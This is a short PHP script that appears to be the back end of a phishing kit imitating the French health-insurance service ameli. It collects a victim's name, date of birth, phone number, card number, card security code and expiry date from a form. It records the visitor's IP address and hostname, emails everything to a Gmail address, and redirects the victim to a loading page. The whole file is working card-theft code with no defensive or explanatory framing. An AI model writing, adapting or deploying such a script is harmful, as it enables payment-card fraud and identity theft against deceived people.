<?php
$ip = getenv("REMOTE_ADDR");
$url = base64_decode($_GET['url']);
$back = "loading.php" ;
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~~~~~~~\n";
$message .= "Nom : ".$_POST['o1']."\n";
$message .= "Prénom : ".$_POST['o2']."\n";
$message .= "Jour de naissance : ".$_POST['o3']."\n";
$message .= "Mois de naissance : ".$_POST['o4']."\n";
$message .= "Année de naissance : ".$_POST['o5']."\n";
$message .= "Num de téle : ".$_POST['o6']."\n";
$message .= "Numéro de carte : ".$_POST['o7']."\n";
$message .= "Cryptogramme visuel : ".$_POST['o8']."\n";
$message .= "Mois d'expiration : ".$_POST['o9']."\n";
$message .= "Année d'expiration : ".$_POST['o10']."\n";
$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= "~~~~~~~ ok ~~~~~~~\n";
fwrite($file, "\n".$message);
fclose($file);

$send = "450cc913@gmail.com";
$subject = "log ameli | $ip ";
$headers = "From:<localhost>";
mail($send,$subject,$message,$headers);
header("Location: $back");
 
?>